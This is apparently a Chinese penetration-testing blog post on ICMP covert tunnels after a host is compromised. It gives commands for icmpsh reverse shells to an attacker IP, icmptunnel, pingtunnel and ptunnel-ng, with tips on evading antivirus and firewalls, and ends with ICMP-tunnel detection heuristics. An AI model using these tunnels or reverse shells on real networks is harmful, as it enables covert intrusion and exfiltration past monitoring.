\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s?\_\_biz=MzI5MDE0MjQ1NQ==&mid=2247493659&idx=1&sn=47262350804ee7ab45f7a25da61c62c4&chksm=ec26c983db514095953f2012770d132dee3b9ef46f18ed580d19517359fcc5333c2a4c380473&mpshare=1&scene=1&srcid=1013us8kgiLxWNjHVDqkaiwU&sharer\_sharetime=1602549022505&sharer\_shareid=c051b65ce1b8b68c6869c6345bc45da1&key=8c9049d0f83009feea9e27e796d9c2d02e31148e789067266322c0f6a3873df04fe6d9ebc25ee1fb7750fd36a27f6a1268135e5f347c0a7a31802b46d4897105025ad523fb8d8a72332bdfe9ca9119bde0ba27fc909fc43bda9fb59411c9a07b3bd670a0dd830f02aaf6b7850173f38e3de12f06adf44b5749f4be288361b98c&ascene=1&uin=ODk4MDE0MDEy&devicetype=Windows+10+x64&version=6300002f&lang=zh\_CN&exportkey=AUZoP0FmSlhT7gJ6ppgoY7I%3D&pass\_ticket=2G6SwO4uyYCX4aTiQDJvW1D1IrAJXn1CnpH%2BbX1rykSOMZNKPaotYwa2vyHnTBud&wx\_header=0)

0x01 前言
-------

在拿下一台主机后，往往需要执行一些命令或者上传下载一些文件，以便我们提权，转发等操作，但现在大型企业在网络边界往往部署了流量分析设备，这些设备会对数据包进行分析，如果说我们的 shell 没有进行加密，那么自然很容易就会被抓到。另外网络中的防火墙设备也会对某些特定的端口数据包进行封堵，导致 shell 无法连接。

这时就需要隧道技术来进行数据封装，从而达到绕过的目的。

ps：隐藏隧道通信技术很早就有了，现阶段的安全设备也更新迭代了好几波了，这里只是做一个介绍和学习，在实战中使用什么隧道，什么加密，数据包怎么切割封装，什么工具比较稳定等还需要多实战测试。

0x02 ICMP 流量结构
--------------

*   ICMP 协议在实际传输中数据包：20 字节 IP 首部 + 8 字节 ICMP 首部 + 1472 字节 <数据大小>
    
*   ICMP 报文格式：IP 首部（20 字节） + 8 位类型 + 8 位代码 + 16 校验和 + （不同类型和代码，格式也有所不同）
    
*   ping 和 ICMP 的关系：ping 命令发送数据使用的是 ICMP 协议
    
*   ICMP 协议通过 IP 协议发送的，IP 协议是一种无连接的，不可靠的数据包协议
    
*   向指定的网络地址发送一定长度的数据包，按照约定，若指定网络地址存在的话，会返回同样大小的数据包
    
*   除了 ping 还有 Traceroute 也使用了 icmp 协议，另外一些设备也会通过该协议去判断某些错误
    

先看一个正常的 ping 请求发送的 ICMP 数据包

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57woETwPia7nVuRpBCiaSoksPl9QdFiaPB3lEqria0EvUrCVlZk38uB1gjgA/640?wx_fmt=png)

可以看到长度为 74，数据为 32 字节的固定内容。当然也可以使用 - l 参数来制定数据长度。

0x03 ICMP 隧道优缺点
---------------

优点：

防火墙对 ICMP\_ECHO 数据包是放行的，并且内部主机不会检查 ICMP 数据包所携带的数据内容，隐蔽性高。

缺点：

ICMP 隐蔽传输是无连接的，传输不是很稳定，而且隐蔽通道的带宽很低

利用隧道传输时，需要接触更低层次的协议，需要高级用户权限

0x04 ICMP 隧道
------------

先把虚拟机的入站连接全部干掉，在防火墙上添加过滤即可。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA570MyVVpic64bAqKAbM9WKOeRoaibZVwPQuFx4JiaT8NOguxLtiatlSKeFjw/640?wx_fmt=png)

4.1 icmpsh
----------

icmpsh 是一个反向 icmp shell，被控端只能支持 windows，控制端可以支持 c、perl、python 环境。

在渗透过程中，遇到目标不能正常返回 tcp 的 shell 时，就可以尝试使用该工具，通过走 icmp 去获取一个 shell。

在运行时不要忘记关闭 icmp 应答，要不会陷入个死循环。

sysctl -w net.ipv4.icmp\_echo\_ignore\_all=1

在控制端执行监听：icmpsh\_m.py attack-IP target-IP

把 exe 文件上传到目标机，如果主机有杀软需要关闭杀软或者对这个 exe 文件进行免杀处理。

执行：icmpsh.exe -t attack-ip

稳定性和速度都尚可。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57tApMU8HIibUj93jF0odwlXNKE8Q41hbXFWCVooEibn9Lm4BxapqbUzXw/640?wx_fmt=png)

观察可以发现，由目标机不断向攻击机发送 ICPM 包，攻击会把命令带到返回包中，当目标机接收命令后会将结果带到请求中。

同时控制每个包的数据长度在 106，数据长度都是 64。在等待过程中，数据包中都不会带有 data 内容。

4.2 icmp 隧道
-----------

ICMP 隧道是指将 TCP 连接通过 ICMP 包进行隧道传送。隧道呢可以理解为一个点对点连接。通过 icmp 隧道可以做到

*   突破专门认证：连接到公共场所，如酒店、机场等 wifi，可以突破其页面认证
    
*   突破防火墙：绕过防火墙的一些防护策略
    
*   加密通信：可以通过加密，创建完全加密的通信通道
    
*   突破运营商的 TCP 或者 UDP 速度限制
    

### 4.2.1 icmptunnel

icmptunnel 是一个稳定的 icmp 隧道建立工具，可以穿过状态防火墙或 NAT。它和 ptunnel 不同的是，可以通过隧道代理任何 IP 流量。此外，所有的客户端 IP 包 - 而不仅仅是单个会话，端口等。

优点

*   数据加密 - ICMP 有效载荷是加密的。
    
*   多功能性 - 任何 IP 流量都可以通过隧道。
    

使用方法

```
下载
git clone https://github.com/DhavalKapil/icmptunnel

编译 
cd icmptunnel
make在服务端（攻击机）起服务（需要root权限）
./icmptunnel -s 10.0.1.1
```

在客户端执行

```
roule -n //查看网关地址
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57V5CULTxWXfcSbLianHMSahicVfys8lJKQd5UFDcUG7TjCqcDBSwH8eKg/640?wx_fmt=png)

然后编辑 client.sh, 替换 server 地址，网关以及网口替换成服务端的

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA570nscOsdHXVia96ZHdCGfTnHVpunCzKlA26piamFShKSe5o0HYaBkG8fA/640?wx_fmt=png)

然后执行即可

```
./icmptunnel -c server-ip
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57ggS5icrbyM95YZR8Dv38SNzTLJGeVgf5Ebv3IqXphXocJMpJGsdre3w/640?wx_fmt=png)

这个时候就会建立一个隧道，不出网的机器就可以通过服务端（攻击机）访问 internet，同时走的全是 ICMP 请求。

测试期间遇到一个来自 18.163.116.29 的 ping 请求，然后隧道就会断掉。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57cRxdECsLmRIliaxzxaJGffmwcywKhAn4kt0HgaicWcJDSOVX8pBa4mkQ/640?wx_fmt=png)

后来发现 issues 里面有人提出过这个问题，原因就是因为收到其他机器的 ping 请求。看来工具作者还是没有解决这个问题。不过如果部署在内网中，情况也许就好一点。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57YaT4u8VVR7iaMmAR2kqOu14ibZWpbvY3sOUFBftFZjZv33zRmU5nibqQQ/640?wx_fmt=png)

也发现了其弊端，并没有什么加密的选项。如果想要进行加密，可以在此之上进行运行其他的安全加密协议，如使用 ssh 动态转发

```
ssh -D 8080 -N root@10.0.0.1
```

github 上有两个同名项目，还有一个 300 多星的 jamesbarlow/icmptunnel。功能和上面的一样，使用方式也差不多。

git clone https://github.com/jamesbarlow/icmptunnel.git

```
cd icmptunnel
make
```

同样在公网端启动服务端

./icmptunnel –s

```
ifconfig tun0 10.0.2.1 netmask 255.255.255.0
```

客户端执行

```
./icmptunnel <server>
ifconfig tun0 10.0.2.2 netmask 255.255.255.0
```

这样一条隧道就建立好了，速度和稳定性都还可以。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57HNvqeIAPfPEhWlnmoVKn5Utl96Uib2AgtUH78xDR3oDD5HCXU1XZwaA/640?wx_fmt=png)

流量包中含有明显的特征字段，稳定性还是不错的。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57tHeu8Qp2QFbjic62HgcvULakibpDfElGoHee9mggZ3vAbKMExdoibs9LA/640?wx_fmt=png)

### 4.2.2 pingtunnel

pingtunnel 是把 tcp/udp/sock5 流量伪装成 icmp 流量进行转发的工具。用于突破网络封锁，或是绕过 WIFI 网络的登陆验证，或是在某些网络加快网络传输速度。它把客户端的 TCP 通信通过 ICMP 隧道发送到指定的 ptunnel 服务器。服务器将充当代理，并将 TCP 数据包转发到它们的实际目的地，或从目的地转发。

优点：

*   连接可靠
    
*   支持多连接
    
*   支持加密
    

使用方式

```
sudo wget (最新release的下载链接)
sudo unzip pingtunnel\_linux64.zip
sudo ./pingtunnel -type server
```

在渗透中，往往需要内网的服务器做 server 端，web 服务器当做跳板进行转发。

这里更敢兴趣的是他的加速功能，在 VPS 上部署后，启动 server 端

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA575YqICtcAVYkg5TlXLZ2jT6qqMEukDWBibhOuWkOUiaDIBf368rezolBg/640?wx_fmt=png)

在本地执行./pingtunnel -type client -l :4455 -s xxxx -sock5 1 就会有一个本地 4455 端口的 socks5 代理，代理挺稳定的。观察数据包发现其 data 填充好像没什么规律，数据包长度都不太一样。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibXnnuXtZcFYVnCwzLOuA57pVk0hiamRicqogP2ibsYAibjlZJJkkicBUDNvLFaiamx0qZcUMo60wTJT5IA/640?wx_fmt=png)

### 4.2.3 ptunnel-ng

ptunnel-ng 是 Ptunnel 的一个 bug 修正和重构版本，它添加了一些额外的特性

安装

windows 下可以直接下载相应文件

linux 需要下载编译安装

```
git clone https://github.com/lnslbrty/ptunnel-ng.git
cd ptunnel-ng/
执行./autogen.sh
如果报错说命令没找到，需要安装autoconf automake libtool依赖库
make install
```

使用

```
Proxy(Server):
./ptunnel-ng -r<destination address> -R<destination port> -v <loglevel>
-P<password> -u<user> -g<group>
Forwarder(Client):
./ptunnel-ng -p <address> -l <listen port> -r<destination address>
-R<destination port> -v <loglevel>
-P<password> -u<user> -g<group>
```

使用 icmp 隧道打开 ssh

```
在server端执行
ptunnel-ng
在client端执行
ptunnel-ng -p\[Server-IP/NAME\] -l2222
```

另外测试时如果公网 vps 不能 ping 通内网出口 IP 地址时，那么只能由 VPS 去连接内网主机，内网主机去连接 VPS 会因为 ping 包无法接受问题导致无法连接。

0x05 流量检测
---------

1、检测同一来源 ICMP 数据包的数量。一个正常的 ping 每秒最多只会发送两个数据包，而使用 ICMP 隧道的有大量数据包

2、注意那些 ICMP 数据包中 payload 大于 64 比特的数据包。当然 icmptunnel 可以配置限制所有数据包的 payload 为 64 比特，这样会使得更难以被检测到。

3、寻找那些响应数据包中 payload 跟请求数据包不一致的 ICMP 数据包。

4、检查 ICMP 数据包的协议标签。例如，icmptunnel 会在所有的 ICMPpayload 前面增加 ‘TUNL’ 标记以用于识别隧道，这就是特征。

5、数据包内容，正常和不正常那不一眼就能看明白么

```
windows系统下ping默认传输的是：abcdefghijklmnopqrstuvwabcdefghi，共32bytes

linux系统下，ping默认传输的是48bytes，前8bytes随时间变化，后面的固定不变，内容为!”#$%&’()+,-./01234567
```

0x06 总结
-------

在实际渗透过程中，还是需要根据实际环境来使用相应工具，所以掌握和运用这些工具也是很有必要的。能够快速决定使用什么工具和部署也是很有必要的，必经在攻防演练中，时间还是很重要的。

1、目标不出网可以 ping 通，使用 icmpsh 获取 shell。注意免杀

2、内网服务器由于防火墙原因，TCP 和 UDP 流量被封禁，在 DMZ 区的主机上搭建 icmp 隧道。

0x07 参考文章
---------

隧道技术之 DNS 和 ICMP 与其检测防御

内网渗透之 ICMP 隐藏隧道